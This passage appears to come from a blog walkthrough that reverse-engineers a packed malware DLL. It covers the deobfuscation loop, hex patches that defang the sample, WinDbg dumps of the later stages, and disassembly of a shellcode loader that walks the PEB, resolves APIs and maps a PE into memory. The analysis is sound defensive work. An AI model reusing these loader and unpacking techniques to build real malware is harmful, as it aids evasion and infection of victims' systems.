DllEntryPoint+11j\r\n.text:004014B3 call UselessComplicatedFunction ; <-- call this about a million times\r\n.text:004014B3 ; Honestly, I suspect this is a whole lot of nothing that\'s done to waste time\r\n.text:004014B8 dec ebx\r\n.text:004014B9 cmp ebx, 43h\r\n.text:004014BC jnz short loc_4014B3\r\n\nI went through that entire function, and determined:\n\nThere are no inputs\nNothing is returned\nNo global variables are touched\nNo API calls are made\n\nBasically, it does nothing. But it does it with a lot of code!\nThen it gets the string length of the main function, which doesn\'t even make any sense, and ignores the response:\n\r\n.text:004014C3 call ds:lstrlenA ; <-- get the strlen() of main(), which should be ignored\r\n\nThen it gets the current process id about a million times:\n\r\n.text:004014C9 mov ebx, 0FFFFFFh\r\n.text:004014CE\r\n.text:004014CE loc_4014CE: ; CODE XREF: DllEntryPoint+2Cj\r\n.text:004014CE call GetCurrentProcessIdWrapper ; Call GetCurrentProcessId about a sixteen million times\r\n.text:004014D3 dec ebx\r\n.text:004014D4 cmp ebx, 43h\r\n.text:004014D7 jnz short loc_4014CE\r\n\nThis function has no side effects and the return value is ignored. Once again, wasting time.\nThen, we finally get to something interesting! This code:\n\r\n.text:004014D9 push PAGE_EXECUTE_READWRITE ; flProtect\r\n.text:004014DB push 3000h ; flAllocationType = MEM_COMMIT | MEM_RESERVE\r\n.text:004014E0 push 30AD8h ; dwSize\r\n.text:004014E5 push 0 ; lpAddress\r\n.text:004014E7 call ds:VirtualAlloc ; Allocate memory to store the decrypted code\r\n.text:004014ED mov edx, eax\r\n.text:004014EF mov edi, eax ; edi => destination memory\r\n\nAllocates 0x30ad8 bytes of read/write/execute memory, and stores the pointer to the memory in edi. \nEven though malware is malware—and you can never realllllly be sure why it\'s doing something—allocating a very specific amount of r/w/x memory almost always means one thing—it\'s going to unpack something into that buffer and then execute it.\nAnd sure enough, that piece of code is followed by a de-obfuscation loop (I originally called it a \"decryption loop\", but that was technically wrong since it isn\'t actually decrypting anything):\n\r\n.text:004014F6 decrypt_loop: ; CODE XREF: DllEntryPoint+6Dj\r\n.text:004014F1 mov esi, offset start_encrypted_code\r\n.text:004014F6 call XorAndRotate ; eax = the next 4 non-NULL bytes in esi, each XORed by ebx (0x43?)\r\n.text:004014FB shl al, 2\r\n.text:004014FE shr ax, 2\r\n.text:00401502 stosb\r\n.text:00401503 shl ah, 4\r\n.text:00401506 shr eax, 8\r\n.text:00401509 shl ax, 2\r\n.text:0040150D shr eax, 6\r\n.text:00401510 stosw\r\n.text:00401512 cmp esi, offset end_encrypted_data\r\n.text:00401518 jbe short decrypt_loop\r\n\nFeel free to look at the function I called XorAndRotate—it\'s pretty boring. It just twiddles the current uint32 a bit.\nYou\'ll notice that esi—typically the \"source\" pointer—is initialized to something I called start_encrypted_code. I\'m using the term \"encrypted\" in only the most general sense; \"obfuscated\" would have been better, but it\'s harder to type. If you dig deeper, this is what it looks like:\n\r\n.text:00401549 start_encrypted_code db 0D6h, 0E6h, 1Bh, 0BAh, 0C0h, 0F1h, 0CDh, 0C2h, 0, 0D5h\r\n.text:00401549 ; DATA XREF: DllEntryPoint+46o\r\n.text:00401549 db 5Eh, 0B6h, 97h, 0EBh, 0C0h\r\n.text:00401558 dd 2 dup(83008300h), 0C2D50033h, 53C02D2Dh, 0C7008300h\r\n.text:00401558 dd 6A78300h, 83000F49h, 83008300h, 81C88300h, 0C8C0C700h\r\n.text:00401558 dd 4C70081h, 810481C8h, 4E18300h, 8B6F1B04h, 0D6B68300h\r\n.text:00401558 dd 8CB98Ch, 830083h, 1F830083h, 0C2B79A97h, 6C001FE6h\r\n.text:00401558 dd 53D5004Eh, 1F2512A7h, 1FB44EE6h, 61B8300h, 681B9h, 830083h\r\n[...]\r\n\nAnd so on, for a long, long time. Almost certainly obfuscated code. And since it\'s being sent through that de-obfuscation function, that pretty much confirms it.\nThe function ends with:\n\r\n.text:0040151A pop ebx\r\n.text:0040151B pop edi\r\n.text:0040151C pop esi\r\n.text:0040151D jmp edx\r\n\nWhere edx—at that point—contains a pointer to the decrypted buffer.\nSo, we see a function that:\n\nWastes a ton of time\nAllocated executable memory\nPopulates the executable memory\nJumps to the executable memory\n\nA classic decryption/deobfuscation loop!\nLet\'s look at the easiest possible way to own it!\nOwning stage1\nSo, I\'m lazy. Really lazy. I\'m gonna find the easiest possible way to decrypt this bad boy.\nWARNING: I run malware in this section. It\'s de-clawed, but you never know what clever tricks are used (I used to have a cat that was de-clawed, and believe me: they still have sharp teeth!); only do this in a throw-away virtual machine! Never, NEVER run this on any important system!\nAll right, so we have a useless function at the top (I enabled the \'code bytes\' now so we can see what the machine code looks like):\n\r\n.text:004014B3 E8 C0 FE FF FF call UselessComplicatedFunction ; <-- call this about a million times\r\n.text:004014B3 ; Honestly, I suspect this is a whole lot of nothing that\'s done to waste time\r\n.text:004014B8 4B dec ebx\r\n.text:004014B9 83 FB 43\r\n\nI\'m paranoid; mayyybe it\'s doing something important? So I\'m gonna fire up a hex editor (like xvi32), search the sample.dll binary for the machine code, \"e8 c0 fe ff ff 4b 83 fb 43\" (which should be at offset 0x8b3 in the file), and nop out the call (\"e8 c0 fe ff ff\" -> \"90 90 90 90 90\").\nThat way, even if it is doing something sneaky, it\'s never called anyways.\nNext, I\'m going to do the same to the GetProcessId wrapper:\n\r\n.text:004014CE E8 D1 FF FF FF call GetCurrentProcessIdWrapper ; Call GetCurrentProcessId about a sixteen million times\r\n.text:004014D3 4B dec ebx\r\n.text:004014D4 83 FB 43 cmp ebx, 43h\r\n\nThe \'call\' instruction, which you can find at offset 0x8ce in the file, also needs to be replaced with \"90 90 90 90 90\".\nFinally, we don\'t want the malware to actually run. That would defeat the entire purpose of de-clawing! So we find the code at the bottom:\n\r\n.text:00401518 76 DC jbe short decrypt_loop\r\n.text:0040151A 5B pop ebx\r\n.text:0040151B 5F pop edi\r\n.text:0040151C 5E pop esi\r\n.text:0040151D FF E2 jmp edx\r\n.text:0040151D DllEntryPoint endp\r\n.text:0040151D\r\n.text:0040151F ; ---------------------------------------------------------------------------\r\n.text:0040151F C3 retn\r\n\nWe want to find the jmp instruction (\"ff e2\")—which should be at 0x91d in the file—and replace it with \"cd 03\".\nWait, what\'s cd 03!?\nIt\'s \"int 3\". Besides being my license plate, it\'s also the instruction that means \"debug breakpoint\". In other words, if a running application hits that instruction, it\'ll fire a debug interrupt. If the application is being debugged, the debugger gets control; if it\'s not, the application will simply crash. Whatever the case: it will never run the malicious code!\nSave the new .dll—you can find this in the .zip under the name \"sample_safe.bin\"—and load it in IDA just to make sure. It should now look like this—note that there\'s only the one call left:\n\r\n.text:004014AB DllEntryPoint proc near ; DATA XREF: DllEntryPoint+13o\r\n.text:004014AB\r\n.text:004014AB hinstDLL = dword ptr 4\r\n.text:004014AB fdwReason = dword ptr 8\r\n.text:004014AB lpReserved = dword ptr 0Ch\r\n.text:004014AB\r\n.text:004014AB push esi\r\n.text:004014AC push edi\r\n.text:004014AD push ebx\r\n.text:004014AE mov ebx, 0FFFFFh\r\n.text:004014B3\r\n.text:004014B3 loc_4014B3: ; CODE XREF: DllEntryPoint+11j\r\n.text:004014B3 nop\r\n.text:004014B4 nop\r\n.text:004014B5 nop\r\n.text:004014B6 nop\r\n.text:004014B7 nop\r\n.text:004014B8 dec ebx\r\n.text:004014B9 cmp ebx, 43h\r\n.text:004014BC jnz short loc_4014B3\r\n.text:004014BE push offset DllEntryPoint ; lpString\r\n.text:004014C3 call ds:lstrlenA\r\n.text:004014C9 mov ebx, 0FFFFFFh\r\n.text:004014CE\r\n.text:004014CE loc_4014CE: ; CODE XREF: DllEntryPoint+2Cj\r\n.text:004014CE nop\r\n.text:004014CF nop\r\n.text:004014D0 nop\r\n.text:004014D1 nop\r\n.text:004014D2 nop\r\n.text:004014D3 dec ebx\r\n.text:004014D4 cmp ebx, 43h\r\n.text:004014D7 jnz short loc_4014CE\r\n.text:004014D9 push 40h ; flProtect\r\n.text:004014DB push 3000h ; flAllocationType\r\n.text:004014E0 push 30AD8h ; dwSize\r\n.text:004014E5 push 0 ; lpAddress\r\n.text:004014E7 call ds:VirtualAlloc\r\n.text:004014ED mov edx, eax\r\n.text:004014EF mov edi, eax\r\n.text:004014F1 mov esi, offset byte_401549\r\n.text:004014F6\r\n.text:004014F6 loc_4014F6: ; CODE XREF: DllEntryPoint:loc_401518j\r\n.text:004014F6 call sub_401520\r\n.text:004014FB shl al, 2\r\n.text:004014FE shr ax, 2\r\n.text:00401502 stosb\r\n.text:00401503 shl ah, 4\r\n.text:00401506 shr eax, 8\r\n.text:00401509 shl ax, 2\r\n.text:0040150D shr eax, 6\r\n.text:00401510 stosw\r\n.text:00401512 cmp esi, offset byte_43201D\r\n.text:00401518\r\n.text:00401518 loc_401518: ; CODE XREF: .text:00401556j\r\n.text:00401518 jbe short loc_4014F6\r\n.text:0040151A pop ebx\r\n.text:0040151B pop edi\r\n.text:0040151C pop esi\r\n.text:0040151D int 3 ; - software interrupt to invoke the debugger\r\n.text:0040151F retn\r\n.text:0040151F DllEntryPoint endp\r\n\nAwesome! Now let\'s write a quick app to run it:\n\r\n#include <windows.h>\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n        LoadLibrary(\"C:\\\\Documents and Settings\\\\Administrator\\\\Desktop\\\\sample_safe.bin\");\r\n\r\n        return 0;\r\n}\r\n\nAnd compile it, then run it in a debugger (I\'m going to use windbg, since that\'s my favourite debugger):\n\r\nC:\\Program Files\\Debugging Tools for Windows (x86)>windbg \'c:\\Documents and Settings\\Administrator\\My Documents\\Visual Studio 2008\\Projects\\test_malware\\Debug\\test_malware.exe\'\r\n\r\nExecutable search path is:\r\nModLoad: 00400000 0041b000 test_malware.exe\r\nModLoad: 7c800000 7c8c0000 ntdll.dll\r\nModLoad: 77e40000 77f42000 C:\\WINDOWS\\system32\\kernel32.dll\r\nModLoad: 10200000 10323000 C:\\WINDOWS\\WinSxS\\x86_Microsoft.VC90.DebugCRT_1fc8b3b9a1e18e3b_9.0.21022.8_x-ww_597C3456\\MSVCR90D.dll\r\n(1b8.2d4): Break instruction exception - code 80000003 (first chance)\r\neax=10400000 ebx=7ffda000 ecx=00000003 edx=00000008 esi=7c8877f4 edi=00151f38\r\neip=7c81a3e1 esp=0012fb70 ebp=0012fcb4 iopl=0 nv up ei pl nz na po nc\r\ncs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202\r\n*** ERROR: Symbol file could not be found. Defaulted to export symbols for ntdll.dll -\r\nntdll!DbgBreakPoint:\r\n7c81a3e1 cc int 3\r\n0:000> g\r\nModLoad: 00350000 00389000 C:\\Documents and Settings\\Administrator\\Desktop\\sample_safe.bin\r\nModLoad: 77380000 77411000 C:\\WINDOWS\\system32\\user32.dll\r\nModLoad: 77c00000 77c48000 C:\\WINDOWS\\system32\\GDI32.dll\r\nModLoad: 77f50000 77feb000 C:\\WINDOWS\\system32\\ADVAPI32.dll\r\nModLoad: 77c50000 77cef000 C:\\WINDOWS\\system32\\RPCRT4.dll\r\nModLoad: 76f50000 76f63000 C:\\WINDOWS\\system32\\Secur32.dll\r\n(1b8.2d4): Break instruction exception - code 80000003 (first chance)\r\neax=00035000 ebx=003514ab ecx=77e64590 edx=003b0000 esi=0012f7d0 edi=00000001\r\neip=0035151e esp=0012f7c0 ebp=0012f7dc iopl=0 nv up ei pl nz na po nc\r\ncs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202\r\n*** ERROR: Module load completed but symbols could not be loaded for C:\\Documents and Settings\\Administrator\\Desktop\\sample_safe.bin\r\nsample_safe+0x151e:\r\n0035151e 03c3 add eax,ebx\r\n\nNote that it hits a \"break instruction\"! Perfect!\nWe know that the original instruction was \"jmp edx\", and therefore the code is pointed at by edx. Sure enough, if we dump edx, we get something that looks like code:\n\r\n0:000> u edx\r\n003b0000 55 push ebp\r\n003b0001 89e5 mov ebp,esp\r\n003b0003 83ec04 sub esp,4\r\n003b0006 56 push esi\r\n003b0007 57 push edi\r\n003b0008 53 push ebx\r\n003b0009 e800000000 call 003b000e\r\n003b000e 5b pop ebx\r\n\nPerfect! We also know the length of the buffer, from the VirtualAlloc() call, so dump that many bytes to a file:\n\r\n0:000> .writemem c:\\\\stage2.bin 0x3b0000 L0x30AD8\r\nWriting 30ad8 bytes..................................................................................................\r\n\nAnd open the file in IDA—yup, that\'s code!\nAnd thus we\'re finished stage1. Congrats!\nStage2: going raw\nIf you load Stage2 in IDA, it\'s going to complain that it isn\'t actually a PE file—it\'s raw code. That\'s fine—load it as raw 32-bit code.\nIf you scroll around (you may need to use \'c\' to mark stuff as code), you\'ll see a small amount of code (with interspersed strings), followed by another block that looks encrypted/obfuscated, including something that looks suspiciously—but not exactly—like part of a PE header:\n\r\nseg000:0000040E                 db  54h ; T\r\nseg000:0000040F                 db  68h ; h\r\nseg000:00000410                 db  69h ; i\r\nseg000:00000411                 db  73h ; s\r\nseg000:00000412                 db  20h\r\nseg000:00000413                 db  0Eh\r\nseg000:00000414                 db  70h ; p\r\nseg000:00000415                 db  72h ; r\r\nseg000:00000416                 db  6Fh ; o\r\nseg000:00000417                 db  67h ; g\r\nseg000:00000418                 db  67h ; g\r\nseg000:00000419                 db  61h ; a\r\nseg000:0000041A                 db  6Dh ; m\r\nseg000:0000041B                 db  87h ; ç\r\nseg000:0000041C                 db  63h ; c\r\nseg000:0000041D                 db  47h ; G\r\nseg000:0000041E                 db  6Eh ; n\r\n\nWell, time to start all over!\nBy now, you know that my usual strategy is to let the program own itself, rather than spending a lot of time owning it. As a result, I don\'t really know how the obfuscation works; I just know how to bypass it!\nIf you\'re following along, I\'m not going to be a ton of help on how to get the function readable. It\'s a mixture of \"c\" (for \"code\" sections), and \"u\" (to undefine non-code portions). After you see a short \"call\" that jumps over some weird looking code, that code probably needs to be undefined (or defined as an \"a\"scii string).\nIf you do everything right, it should wind up looking like this:\n\r\nseg000:00000000                 push    ebp             ; Standard function prefix\r\nseg000:00000001                 mov     ebp, esp\r\nseg000:00000003                 sub     esp, 4          ; 4 bytes for local variables\r\nseg000:00000006                 push    esi\r\nseg000:00000007                 push    edi\r\nseg000:00000008                 push    ebx\r\nseg000:00000009                 call    $+5\r\nseg000:0000000E                 pop     ebx\r\nseg000:0000000F                 sub     ebx, 40100Eh\r\nseg000:00000015                 mov     eax, dword ptr fs:loc_2C+4\r\nseg000:0000001B                 mov     eax, [eax+0Ch]\r\nseg000:0000001E                 mov     eax, [eax+1Ch]\r\nseg000:00000021\r\nseg000:00000021 loc_21:                                 ; CODE XREF: seg000:0000002Aj\r\nseg000:00000021                 mov     esi, [eax+8]\r\nseg000:00000024                 cmp     byte ptr [eax+1Ch], 18h\r\nseg000:00000028                 mov     eax, [eax]\r\nseg000:0000002A                 jnz     short loc_21\r\nseg000:0000002C\r\nseg000:0000002C loc_2C:                                 ; DATA XREF: seg000:00000015r\r\nseg000:0000002C                                         ; sub_2E5+4:r\r\nseg000:0000002C                 call    loc_40\r\nseg000:0000002C ; ---------------------------------------------------------------------------\r\nseg000:00000031 aGetProcAddress db \'GetProcAddress\',0\r\nseg000:00000040 ; ---------------------------------------------------------------------------\r\nseg000:00000040\r\nseg000:00000040 loc_40:                                 ; CODE XREF: seg000:loc_2Cp\r\nseg000:00000040                 push    esi\r\nseg000:00000041                 call    sub_188\r\nseg000:00000046                 mov     [ebx+4013BCh], eax\r\nseg000:0000004C                 call    loc_5E\r\nseg000:0000004C ; ---------------------------------------------------------------------------\r\nseg000:00000051 aLoadlibrarya   db \'LoadLibraryA\',0\r\nseg000:0000005E ; ---------------------------------------------------------------------------\r\nseg000:0000005E\r\nseg000:0000005E loc_5E:                                 ; CODE XREF: seg000:0000004Cp\r\nseg000:0000005E                 push    esi\r\nseg000:0000005F                 call    dword ptr [ebx+4013BCh]\r\nseg000:00000065                 mov     [ebx+4013C0h], eax\r\nseg000:0000006B                 call    loc_80\r\nseg000:0000006B ; ---------------------------------------------------------------------------\r\nseg000:00000070 aUnmapviewoffile db \'UnmapViewOfFile\',0\r\nseg000:00000080 ; ---------------------------------------------------------------------------\r\nseg000:00000080\r\nseg000:00000080 loc_80:                                 ; CODE XREF: seg000:0000006Bp\r\nseg000:00000080                 push    esi\r\nseg000:00000081                 call    dword ptr [ebx+4013BCh]\r\nseg000:00000087                 mov     [ebx+4013C4h], eax\r\nseg000:0000008D                 call    loc_9F\r\nseg000:0000008D ; ---------------------------------------------------------------------------\r\nseg000:00000092 aVirtualalloc   db \'VirtualAlloc\',0\r\nseg000:0000009F ; ---------------------------------------------------------------------------\r\nseg000:0000009F\r\nseg000:0000009F loc_9F:                                 ; CODE XREF: seg000:0000008Dp\r\nseg000:0000009F                 push    esi\r\nseg000:000000A0                 call    dword ptr [ebx+4013BCh]\r\nseg000:000000A6                 mov     [ebx+4013C8h], eax\r\nseg000:000000AC                 call    loc_BD\r\nseg000:000000AC ; ---------------------------------------------------------------------------\r\nseg000:000000B1 aVirtualfree    db \'VirtualFree\',0\r\nseg000:000000BD ; ---------------------------------------------------------------------------\r\nseg000:000000BD\r\nseg000:000000BD loc_BD:                                 ; CODE XREF: seg000:000000ACp\r\nseg000:000000BD                 push    esi\r\nseg000:000000BE                 call    dword ptr [ebx+4013BCh]\r\nseg000:000000C4                 mov     [ebx+4013CCh], eax\r\nseg000:000000CA\r\nseg000:000000CA loc_CA:                                 ; CODE XREF: seg000:000000E0j\r\nseg000:000000CA                 push    4\r\nseg000:000000CC                 push    3000h\r\nseg000:000000D1                 push    0A00000h\r\nseg000:000000D6                 push    0\r\nseg000:000000D8                 call    dword ptr [ebx+4013C8h]\r\nseg000:000000DE                 test    eax, eax\r\nseg000:000000E0                 jz      short loc_CA\r\nseg000:000000E2                 mov     [ebp-4], eax\r\nseg000:000000E5                 push    eax\r\nseg000:000000E6                 lea     eax, [ebx+4013D0h]\r\nseg000:000000EC                 mov     ecx, [eax+4]\r\nseg000:000000EF                 add     eax, ecx\r\nseg000:000000F1                 push    eax\r\nseg000:000000F2                 call    sub_313\r\nseg000:000000F7                 pop     eax\r\nseg000:000000F8                 pop     eax\r\nseg000:000000F9                 mov     esi, [ebp-4]\r\nseg000:000000FC                 add     esi, [esi+3Ch]\r\nseg000:000000FF                 mov     edi, [esi+34h]\r\nseg000:00000102                 mov     eax, [ebp+10h]\r\nseg000:00000105                 test    eax, eax\r\nseg000:00000107                 jnz     short loc_114\r\nseg000:00000109                 mov     eax, [ebp+0Ch]\r\nseg000:0000010C                 dec     eax\r\nseg000:0000010D                 test    eax, eax\r\nseg000:0000010F                 jnz     short loc_114\r\nseg000:00000111                 mov     edi, [ebp+8]\r\nseg000:00000114\r\nseg000:00000114 loc_114:                                ; CODE XREF: seg000:00000107j\r\nseg000:00000114                                         ; seg000:0000010Fj\r\nseg000:00000114                 push    edi\r\nseg000:00000115                 call    dword ptr [ebx+4013C4h]\r\nseg000:0000011B                 mov     eax, [esi+50h]\r\nseg000:0000011E                 push    40h ; \'@\'\r\nseg000:00000120                 push    3000h\r\nseg000:00000125                 push    eax\r\nseg000:00000126                 push    edi\r\nseg000:00000127                 call    dword ptr [ebx+4013C8h]\r\nseg000:0000012D                 mov     ecx, [esi+54h]\r\nseg000:00000130                 mov     esi, [ebp-4]\r\nseg000:00000133                 rep movsb\r\nseg000:00000135                 mov     edi, eax\r\nseg000:00000137                 push    dword ptr [ebp-4]\r\nseg000:0000013A                 push    edi\r\nseg000:0000013B                 call    sub_1E9\r\nseg000:00000140                 push    edi\r\nseg000:00000141                 call    sub_219\r\nseg000:00000146                 push    edi\r\nseg000:00000147                 call    sub_28A\r\nseg000:0000014C                 push    8000h\r\nseg000:00000151                 push    0\r\nseg000:00000153                 push    dword ptr [ebp-4]\r\nseg000:00000156                 call    dword ptr [ebx+4013CCh]\r\nseg000:0000015C                 mov     eax, [ebx+4013CCh]\r\nseg000:00000162                 lea     ecx, [ebx+401000h]\r\nseg000:00000168                 mov     edx, [edi+3Ch]\r\nseg000:0000016B                 add     edx, edi\r\nseg000:0000016D                 mov     edx, [edx+28h]\r\nseg000:00000170                 add     edx, edi\r\nseg000:00000172                 push    edx\r\nseg000:00000173                 push    edi\r\nseg000:00000174                 call    sub_2E5\r\nseg000:00000179                 pop     ebx\r\nseg000:0000017A                 pop     edi\r\nseg000:0000017B                 pop     esi\r\nseg000:0000017C                 leave\r\nseg000:0000017D                 push    8000h\r\nseg000:00000182                 push    0\r\nseg000:00000184                 push    ecx\r\nseg000:00000185                 push    edx\r\nseg000:00000186                 jmp     eax\r\n\nOne of the first things I recommend doing it to re-base the program (using edit->segments->rebase or something like that). I re-based to 0x3b0000, because that\'s the offset that was allocated by VirtualAlloc() on my system, and therefore is where the in-memory version ended up.\nSome reversing\nThe first part took me some time to figure out:\n\r\nseg000:003B0015                 mov     eax, large fs:30h ; This section basically gets a handle to kernel32.dll\r\nseg000:003B001B                 mov     eax, [eax+0Ch]\r\nseg000:003B001E                 mov     eax, [eax+1Ch]\r\nseg000:003B0021\r\nseg000:003B0021 loc_3B0021:                             ; CODE XREF: seg000:003B002Aj\r\nseg000:003B0021                 mov     esi, [eax+8]\r\nseg000:003B0024                 cmp     byte ptr [eax+1Ch], 18h\r\nseg000:003B0028                 mov     eax, [eax]\r\nseg000:003B002A                 jnz     short loc_3B0021 ; When this ends, esi = handle to kernel32.dll\r\n\nI actually googled parts of this, and eventually found an identical function online. Its purpose was to get a handle to the in-memory version of kernel32.dll. Sweet!\nYou\'ll then see this code:\n\r\nseg000:003B002C loc_3B002C:\r\nseg000:003B002C                 call    loc_3B0040\r\nseg000:003B002C ; ---------------------------------------------------------------------------\r\nseg000:003B0031 aGetProcAddress db \'GetProcAddress\',0\r\nseg000:003B0040 ; ---------------------------------------------------------------------------\r\nseg000:003B0040\r\nseg000:003B0040 loc_3B0040:                             ; CODE XREF: seg000:loc_3B002Cp\r\nseg000:003B0040                 push    esi             ; addr of kernel32.dll\r\nseg000:003B0041                 call    find_function\r\nseg000:003B0046                 mov     [ebx+test.addr_GetProcAddress], eax\r\n\n(Note that I defined a struct for test.addr_GetProcAddress—it involves generous use of the \'structs\' tab in a way it was never intended to be used in IDA).\nThe find_function() function was actually a guess that turned out to be right. This sequence of code gets a handle to the GetProcAddress() function, and stores it on line 0x3b0046.\nThen there are a bunch of sequences that basically look like:\n\r\nseg000:003B004C                 call    loc_3B005E\r\nseg000:003B004C ; ---------------------------------------------------------------------------\r\nseg000:003B0051 aLoadlibrarya   db \'LoadLibraryA\',0\r\nseg000:003B005E ; ---------------------------------------------------------------------------\r\nseg000:003B005E\r\nseg000:003B005E loc_3B005E:                             ; CODE XREF: seg000:003B004Cp\r\nseg000:003B005E                 push    esi\r\nseg000:003B005F                 call    [ebx+test.addr_GetProcAddress]\r\nseg000:003B0065                 mov     [ebx+test.addr_LoadLibraryA], eax\r\n\nBasically, it calls GetProcAddress() with \"LoadLibraryA\" as a parameter, and stores the result. It does this for a bunch of functions—basically, get pointers to a host of useful functions:\n\nGetProcAddress\nLoadLibraryA\nUnmapViewOfFile\nVirtualAlloc\nVirtualFree\nVirtualAlloc(), as you\'ll recall, was used in the last section to allocate space for decrypted memory. At this point, we can guess that it does the exact same thing again!\nSure enough, it allocates memory; but surprisingly, it\'s not executable! Here\'s the call:\n\r\nseg000:003B00CA loc_3B00CA:                             ; CODE XREF: seg000:003B00E0j\r\nseg000:003B00CA                 push    4               ; flProtect = PAGE_READWRITE\r\nseg000:003B00CC                 push    3000h           ; flAllocationType = MEM_RESERVE | MEM_COMMIT\r\nseg000:003B00D1                 push    0A00000h        ; dwSize = 10,485,760 bytes\r\nseg000:003B00D6                 push    0               ; lpAddress\r\nseg000:003B00D8                 call    [ebx+test.addr_VirtualAlloc]\r\nseg000:003B00DE                 test    eax, eax\r\nseg000:003B00E0                 jz      short loc_3B00CA\r\n\nNote how it keeps attempting to allocate memory until it works. It\'s shit like this, malware...\nAnyway, the memory is allocated!\nThen a function is called:\n\r\nseg000:003B00E2                 mov     [ebp-4], eax    ; ebp-4 = allocated memory\r\nseg000:003B00E5                 push    eax             ; allocated memory\r\nseg000:003B00E6                 lea     eax, [ebx+test.field_4013D0] ; eax = ptr to encrypted data (003b03d0)\r\nseg000:003B00EC                 mov     ecx, [eax+4]\r\nseg000:003B00EF                 add     eax, ecx\r\nseg000:003B00F1                 push    eax             ; Looks like start of obfuscated PE file (003b03e8)\r\nseg000:003B00F2                 call    sub_3B0313      ; Complicated but looks harmless\r\n\nThe \"encrypted data\"—which, as we saw earlier, looks suspiciously like a PE file—is passed in, along with the allocated memory.\nA fairly complex function is called, that I looked through but didn\'t reverse. It\'s complicated, but ultimately harmless.\nActive analysis\nWith clever use of breakpoints and sweating bullets, I let that function run. If you\'re interested, this is how I did it: run sample_safe.bin in windbg; when the breakpoint fired, I moved eip to where the jump would have gone using \"r eip=edx\" in windbg; I set a breakpoint on line 0x3b00f7 using \"bp 0x3b00f7\"; I used \"g\" to continue the program; and bob\'s your uncle.\nRunning malware like this, once again, is *dangerous*! If you\'re following along, please be careful!\nAnyway, once that function finishes, I check out the allocated memory:\n\r\n0:000> db 900000\r\n00900000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............\r\n00900010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......\r\n00900020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\r\n00900030  00 00 00 00 00 00 00 00-00 00 00 00 e8 00 00 00  ................\r\n00900040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th\r\n00900050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno\r\n00900060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS \r\n00900070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......\r\n\nIt\'s a PE file! w00t!\nSo thinking that\'s a length might just be right! I dump the file to see if IDA recognizes it:\n\r\n0:000> .writemem \"c:\\\\stage3.bin\" 0x900000 L0x00020a00\r\nWriting 20a00 bytes..................................................................\r\n\nRead it with IDA, and confirm that it\'s a valid PE.\nBut... there\'s more code after the PE is decrypted. What\'s going on?\nGoing above and beyond in stage2\nSo, this part is strictly unnecessary to figuring out how the malware works. I was simply curious, and wanted to make sure that nothing weird was going on.\nSome variables are moved around after the decryption, but at this point I\'m carefully stepping through with a debugger. I find this code:\n\r\nseg000:003B0114                 push    edi\r\nseg000:003B0115                 call    [ebx+test.addr_UnmapViewOfFile]\r\n\nAnd determine that edi is pointing to stage1. So, stage1 is unloaded.\nThen, some executable memory is allocated:\n\r\nseg000:003B011E                 push    40h ; \'@\'       ; flProtect = PAGE_EXECUTE_READWRITE\r\nseg000:003B0120                 push    3000h           ; flAlloctionType = MEM_COMMIT | MEM_RESERVE\r\nseg000:003B0125                 push    eax             ; dwSize = a bit bigger than the decrypt function returned\r\nseg000:003B0126                 push    edi             ; lpAddress = the same address that the .dll was unloaded from\r\nseg000:003B0127                 call    [ebx+test.addr_VirtualAlloc]\r\n\nSome incredibly complicated functions are called. I surmised—correctly—that these are taking the PE file in memory—that we just decrypted—and preparing it to be run. Basically, do the relocations and other stuff that is involved with making a PE file actually runnable. \nThen, the decrypted PE file—the version that came before it was actually relocated, that it just finished relocating—is freed:\n\r\nseg000:003B0153                 push    dword ptr [ebp-4]\r\nseg000:003B0156                 call    [ebx+test.addr_VirtualFree]\r\n\nThen finally, this sequence is found:\n\r\nseg000:003B0174                 call    sub_3B02E5\r\nseg000:003B0179                 pop     ebx\r\nseg000:003B017A                 pop     edi\r\nseg000:003B017B                 pop     esi\r\nseg000:003B017C                 leave\r\nseg000:003B017D                 push    8000h\r\nseg000:003B0182                 push    0\r\nseg000:003B0184                 push    ecx\r\nseg000:003B0185                 push    edx\r\nseg000:003B0186                 jmp     eax\r\n\nThis is actually really cool. It calls sub_3b02e5, which returns a pointer to VirtualFree(). On line 0x3b0186, VirtualFree() is jumped to. That leads to two questions: why a jmp and not a call? And if VirtualFree() only takes a single argument, what\'s with all the other pushes?\nWell, here\'s what\'s happening: a called function returns to whatever\'s on the top of the stack. If you jmp to a function that expects to be called, it returns to the last thing pushed onto the stack. Since that happens to be edx (pushed at 0x3b0185), that becomes the return address.\n(edx happens to be the entrypoint of the new .dll file, stage3)\nThe next parameter above it—ecx, pushed at 0x3b0184—is the parameter to VirtualAlloc(). It\'s the starting address of the current code—0x3b0000. And finally, the other two arguments—0x0000 and 0x8000—are the arguments that the entrypoint of the .dll file expects to receive.\nTo summarize: this piece of code frees itself, then returns into the loaded .dll file. That\'s really cool!\nVery little malware will actually clean up after itself like we see here. This tells me that the malware was written by somebody who actually cares about code quality. I\'m impressed!\nStage3: The final frontier\nStage3 is actually pretty straight forward, although it does a lot of stuff that I haven\'t actually reversed. I\'ve also made a lot of educated guesses on how it works that I\'ve validated. If you\'re following along, this is in stage3.bin.\nEssentially, it\'s a compressed payload stored in a PE resource. Let\'s look at what that means...\nFirst off, look at the \'strings\' window (shift-f12 in IDA). Looking at the strings window is almost always the first thing I do, with malware and also legit software. In this case, you\'ll see some interesting strings:\n\r\n.rdata:100054A4 aAplibV1_01TheS db \'aPLib v1.01 - the smaller the better :)\',0Dh,0Ah\r\n.rdata:100054A4 db \'Copyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.\',0Dh,0Ah\r\n.rdata:100054A4 db 0Dh,0Ah\r\n.rdata:100054A4 db \'More information: http://www.ibsensoftware.com/\',0Dh,0Ah\r\n.rdata:100054A4 db 0Dh,0Ah,0\r\n\nImmediately, I know it\'s using compression. That\'s handy! If you follow the DllEntryPoint() function to its calls, you\'ll quickly find this:\n\r\n.text:10001C2E ; int __cdecl 